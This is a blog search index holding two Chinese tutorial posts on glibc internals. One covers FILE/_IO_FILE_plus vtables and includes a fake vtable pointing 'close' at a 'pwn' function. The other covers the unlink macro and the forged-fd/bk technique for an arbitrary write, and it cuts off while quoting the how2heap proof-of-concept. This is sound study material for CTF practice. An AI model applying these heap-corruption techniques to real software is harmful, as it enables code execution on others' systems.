<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>FILE 基本结构</title>
      <link href="/2025/04/29/Linux%20IO%20%E5%BA%93%EF%BC%88%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BA%93%EF%BC%89%E4%BB%8B%E7%BB%8D%EF%BC%9A/"/>
      <url>/2025/04/29/Linux%20IO%20%E5%BA%93%EF%BC%88%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BA%93%EF%BC%89%E4%BB%8B%E7%BB%8D%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-I-O-库（输入-输出库）介绍："><a href="#Linux-I-O-库（输入-输出库）介绍：" class="headerlink" title="Linux I&#x2F;O 库（输入&#x2F;输出库）介绍："></a>Linux I&#x2F;O 库（输入&#x2F;输出库）介绍：</h1><p>IO库 是操作系统提供用于管理数据输入和输出的一组函数和工具。它们通过封装底层系统调用（如 read 、write 、open等），为用户提供更高效、便捷的接口，同时优化性能（如缓冲区管理）。</p><h1 id="FILE-介绍："><a href="#FILE-介绍：" class="headerlink" title="FILE 介绍："></a>FILE 介绍：</h1><p>FILE 在 Linux 系统的标准IO库中是用来描述文件的结构，称为文件流。FILE结构在程序执行 fopen</p><p> 等函数时会进行创建，<u>并分配在堆中</u>。我们常定义一个指向FILE结构的指针来接收这个返回值。</p><p>FILE 结构定义在 libio.h 中 ，如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>进程中的 FILE 结构会通过 _chain 域彼此连接形成以一个链表，链表头部用全局变量 _IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p><p>在标准 I&#x2F;O库中 ，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段 。而我们使用的 fopen 创建的文件流是分配在堆内存上的。</p><p>我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><p>但是事实上 _IO_FILE 结构外包裹着另一种结构 _IO_FILE_plus ，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p><p>在 libc2.23版本下 ，32位的 vtable 偏移为 0x94 ，64位 偏移为 0xd8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vtable 是 IO_jump_t 类型的指针 ，IO_jumo_t 中保存了一些函数指针 ，在后面我们会看到一些列标准 IO 函数中会调用这些函数指针</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识归纳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FILE 基本结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink 讲解以及漏洞利用</title>
      <link href="/2025/04/27/Unsafe-Unlink/"/>
      <url>/2025/04/27/Unsafe-Unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h2><p>Unlink 指的是GNU C库 (glibc) 中用于管理双向链表的一个内部宏，它在heap分配器中负责将相邻的空闲 chunk 合并。 早期版本的 glibc 未对这一过程做严格的安全检查，通过伪造 fd 和 bk ，攻击者可以在 unlink 阶段实现任意写，从而达到代码执行（“Unsafe Unlink”）的效果，后来 glibc 在 2.3.4 版本中引入了 “safe unlink”机制 ， 并在更高版本中通过“Safe-Linking”进一步加强了对链表指针纂改的防御。</p><h3 id="Unlink-的触发开关："><a href="#Unlink-的触发开关：" class="headerlink" title="Unlink 的触发开关："></a>Unlink 的触发开关：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">_int_free()&#123;</span><br><span class="line">unlink();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行 free（） 函数的时候，调用了 _int_free() 函数 ，_int_free()函数内部存在 unlink 宏。</p><h3 id="Unlink-在-glibc-中的作用："><a href="#Unlink-在-glibc-中的作用：" class="headerlink" title="Unlink 在 glibc 中的作用："></a>Unlink 在 glibc 中的作用：</h3><ul><li>双向链表中的节点删除（脱链）</li></ul><p><u>当一个 chunk 从某一个 bin（双向链表）中被移除以便合并时</u>，glibc 会调用 unlink ( ) 宏，定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;      </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">      malloc_printerr (check_action,      </span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">       P, AV);      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">                <span class="keyword">else</span> &#123;      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">                  &#125;      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">              &#125;      </span><br><span class="line">          &#125;      </span><br><span class="line">      &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个源码分为两个部分一个就是 small bin 中的 unlink ，另一个就是 large bin 中的unlink 。</p><p>我们来分析 small bin 中的 unlink ，提取出对应部分的源码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>P 就是我们准备unlink的堆块，在进行unlink操作之前，为了便于理解，我会结合图片进行讲解：</p><p>Part1 ：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;      </span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></figure><p>第一部分的代码其实就是定义 FD为 P 的前空闲块，BK为 P 的后空闲块，于是就出现了以下图示的结构。</p><p><img src="/../PWN/Unlink/1.png" alt="image-20250427171112411"></p><p>Part2 ：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV); </span><br></pre></td></tr></table></figure><p>这是 unlink 一个检查机制 ， 使用 if 函数来进行检查 ，如果检查有问题就会触发 “corrupted double-linked list ” 警告 ，其实检查的内容也非常的简单 ，就是判断 FD 的 bk 是不是 P ，以及判断 BK 的 fd 是不是 P ，Part1 视图的红线部分就是我们要检查的地方 ， 两根红线必须指向 P 内存块 。</p><p>Part3 ：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>假定程序没有出现问题 ，那么恭喜你 ，成功进入了 unlink 的关键一步 。</p><p>源代码也很简单 ，无非就是把 FD 的 bk 指向了 BK ， 把 Bk 的 fd 指向了 FD ，也就是说 part1 红线的指向发生了改变，两条红线不在指向 P 内存块 ， 而是互相指向了对方 ， 这样 P 内存块就会实现 unlink 操作 ， 成功脱离出来，改变后的结构如下：</p><p><img src="/../PWN/Unlink/2.png" alt="image-20250427172655039"></p><p>这样比较难看 ，我们在简化一下 ：</p><p><img src="/../PWN/Unlink/3.png" alt="image-20250427173650021"></p><p>现在的 P 已经脱离出来了 ，以上就是 Unlink 的相关操作 。</p><h1 id="合并相邻堆块时用到Unlink："><a href="#合并相邻堆块时用到Unlink：" class="headerlink" title="合并相邻堆块时用到Unlink："></a>合并相邻堆块时用到Unlink：</h1><p>空闲堆块合并分为向前合并和向后合并两种情况 。</p><p><img src="/../PWN/Unlink/4.png" alt="image-20250427203008314"></p><h2 id="向后合并："><a href="#向后合并：" class="headerlink" title="向后合并："></a>向后合并：</h2><p>假设chunk1已经被free掉了，chunk2将要被free ，这时只要chunk2也被free掉 ，就会触发空闲堆块向后合并，相关源码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">    <span class="title function_">if</span> <span class="params">(!prev_inuse(p))</span> &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">  size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize)); </span><br><span class="line">      unlink(p, bck, fwd);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>这里有一个检查，检查 p 的 prev_inuse 位 ，pre_inuse 为 0 时，则执行 if 语句里面的内容，prev_inuse 简称 P 位 ，用来表示前面的堆块是否已经被分配，prev_inuse 为 1 的时候，代表前面的堆块已经被分配，这个时候不能与之发生合并，所以只有将pre_inuse位设置为 0 的时候，我们才能进行向前合并的操作 。</p><p>我们把这里的 P 看作是 chunk2 ，因为 chunk1 属于空闲状态 ，所以 chunk2 的 prev_inuse 位肯定是为 0 的，于是我们就进入了 if 语句，执行里面的内容，我们来一句一句分析：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prevsize = p-&gt;prev_size;</span><br></pre></td></tr></table></figure><p>先令 prevsize 等于 chunk2的prev_size也就是 chunk1 的大小</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">size += prevsize;</span><br></pre></td></tr></table></figure><p>将 size 的值加上 chunk1 的大小 ，现在的 size 已经是 chunk1 + chunk2 的大小了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize)); </span><br></pre></td></tr></table></figure><p>这里是修改 chunk2 的指针 ，把 chunk2 的指针设置为 chunk1，现在 chunk1 和 chunk2 彻底合并了 ，它们变成了如下结构：</p><p><img src="/../PWN/Unlink/5.png" alt="image-20250427211051172"></p><p>总而言之 ，chunk1 和 chunk2 合并成了一个以 chunk1 为指针的更大的堆块。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unlink(p, bck, fwd);</span><br></pre></td></tr></table></figure><p>合并最后一步就会把合并后的 chunk1 拿去 unlink ，最后再放回 unsorted bin 里面<u>（个人理解 unlink 的本质其实就是刷新 Bin ，当两个空闲堆块进行合并的时候，其大小肯定会发生变化，所以需要unlink把空闲堆块从原先的chunk链中拿出来，按照大小重新放入合适的 Bin 中）</u></p><h2 id="向前合并："><a href="#向前合并：" class="headerlink" title="向前合并："></a>向前合并：</h2><p>现在假设chunk1已经被free掉了，chunk0将要被free ，这时只要chunk0也被free掉 ，就会触发空闲堆块向前合并，相关源码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">……</span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">……</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; </span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; </span><br><span class="line">            unlink(nextchunk, bck, fwd); </span><br><span class="line">          size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);    </span><br><span class="line"></span><br><span class="line">      ……</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们依旧把源码拆解分析：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br></pre></td></tr></table></figure><p>将 nextchunk 设置为 chunk1，将 nextsize 设置为 chunk1 的 size，现在的 nextchunk 就代表了 chunk1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br></pre></td></tr></table></figure><p>这是一个检查 ，判断 nextchunk 是否为 topchunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"><span class="keyword">if</span> (!nextinuse) </span><br></pre></td></tr></table></figure><p>把 nextinuse 设置为 chunk2 的 P 位</p><p>这里是判断 chunk2 的 P 位是否为 0 ，为 0 代表 chunk1 可以进行合并，然后我们就进入 if 语句</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unlink(nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br></pre></td></tr></table></figure><p>先进行 unlink 操作 ，把 chunk1 从所在的 空闲chunk链表中取出来，然后将 chunk0 和 chunk1 进行合并，size 为 chunk0 + chunk1 的总大小，此时的两个chunk已经完全合并了 ，合并完的堆块会根据大小放入到合适的 Bin 中 。</p><p>向前合并和向后合并的主要区别在于：</p><ol><li>向前合并是先unlink后合并，向后合并是先合并后unlink</li><li>向前合并不需要改变指针，向后合并需要改变指针</li></ol><p>向前合并后的结构变化：</p><p><img src="/../PWN/Unlink/6.png" alt="image-20250427214528784"></p><h1 id="Unlink手法的利用："><a href="#Unlink手法的利用：" class="headerlink" title="Unlink手法的利用："></a>Unlink手法的利用：</h1><p>原理：通过伪造堆块 fd 和 bk 指针 ，同时绕过相应的检查，就可以达到任意地址写的目的 。</p><p>条件：</p><ol><li>UAF，可以修改 free 状态下的 small bin 或是 unsorted bin 的 fd 和 bk 指针 。</li><li><u>已知位置存在一个指针</u>指向可以进行 UAF 的 chunk 。</li></ol><p>思路：设指向 UAF chunk 的指针的地址为 ptr </p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18 。</p><p>其中你也许还不知道为什么要使用这个思路 ，接下来我会慢慢跟你讲解 。</p><h2 id="思路讲解："><a href="#思路讲解：" class="headerlink" title="思路讲解："></a>思路讲解：</h2><p>首先我们要知道想要对 unlink 机制进行一个非法利用，达到我们想要的目的 ， 我们就需要绕过相应的检查机制 ，这里我把与 unlink 检查机制相关的源码提取出来（这里就拿向后合并unlink作为分析）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p))</span><br></pre></td></tr></table></figure><p>检查一 ：检查 UAF chunk 后置堆块 P 位是否为 0 ，为 0 才会进行合并 。</p><p>检查一是针对我们需要伪造的chunk的下一个chunk，这里我们需要伪造两个东西 ：</p><ul><li>prev_size 应等于 fake_chunk 的实际大小 </li><li>size 的 P 位为 0</li></ul><p>这两个条件同时满足 ， 就代表 fake_chunk 为 free 状态 ，这样才能进入 unlink 。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>检查二 ：检查伪造堆块的 fd 和 bk 指针 ，看看我们需要 unlink 的堆块的 fd 和 bk 是否指向所在 Bin 的 chunk 链的 FD 和 BK（前空闲堆块和后空闲堆块）。</p><p>其实到这里可以发现 ，我们在上面解题思路中提到过的修改 fd 和 bk ，其实就是为了伪造 fd 和 bk 指针 ， 使其绕过 <u>检查二</u> ，成功从空闲链表中 unlink 出来（我们需要知道当我们想要非法利用unlink的时候，合并unlink的目的不在于合并，而是unlink这个过程需要free合并触发）</p><p><strong><u>那为什么我们要这样进行伪造 fd 和 bk 呢？</u></strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><img src="/../PWN/Unlink/7.png" alt="image-20250428150621525"></p><p>前文说过 ，这两个检查其实就是红线部分 ，在 非法unlink 场景中我们其实是没有 FD  → fake_chunk → BK ，这样的 chunk 链的 ，所以就需要我们伪造 FD 和 BK ，可以说，这个 unlink 的场景从头到尾都是需要我们去伪造的 ，我们要创造一个满足所有需求，绕过所有检查的 BK 、fake_chunk 、FD 这样的 chunk 链 。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &lt;=&gt; *(P-&gt;fd + <span class="number">0x18</span>) == P</span><br><span class="line">p-&gt;bk-&gt;fd == P &lt;=&gt; *(p-&gt;bk + <span class="number">0x10</span>) == P</span><br></pre></td></tr></table></figure><p>FD 、BK 是根据 fake_chunk 的 fd 、bk 进行伪造的 ，所以我们要做到上面这个条件 ，如果看起来还是比较绕的话 ，可以看看下面这张图 ：</p><p><img src="/../PWN/Unlink/8.png" alt="image-20250428152914934"></p><p>fake_chunk 的 fd 就是我们创造出来的 fake_FD 的首地址 ，我们要使它的 bk 满足红线的条件 ， 就必须让 fake_FD 的首地址等于 fake_chunk - 0x18 , 因为 fake_FD 的 bk 距离首地址有 0x18 的距离 ，如果 fake_chunk 的首地址等于 fake_chunk - 0x18 的话 ，那么 fake_FD 的 bk 就等于 fake_chunk - 0x18 + 0x18 也就是 fake_chunk , 这样我们就可以满足条件 ，同理 fake_chunk 的 bk 要等于 fake_chunk - 0x10 , 这样 fake_BK 的首地址为 fake_chunk - 0x10 ，fake_BK 的 fd 就是 fake_chunk - 0x10 + 0x10 也就是 fake_chunk ,这样就满足了之前的条件 ，绕过了检查（如果还觉得绕的话，可以自己绘图推一下）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = P - <span class="number">0x18</span></span><br><span class="line">P-&gt;bk = P - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>这是我们最终要伪造的 fd 和 bk 。</p><h2 id="how2heap源码调试："><a href="#how2heap源码调试：" class="headerlink" title="how2heap源码调试："></a>how2heap源码调试：</h2><p>现在知道了如何通过伪造堆块实现 unlink ，那我们如何通过这个 非法unlink 进一步实现任意地址写呢？为了方便理解 ，我准备采用 how2heap 中关于 unsafe unlink 的攻击源码进行调试，相信在经过调试学习之后，你一定能掌握 unlink 实现任意地址写的操作 。</p><p><strong>LIBC : 2.23-0ubuntu11.3_amd64</strong></p><p>源码展示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line"><span 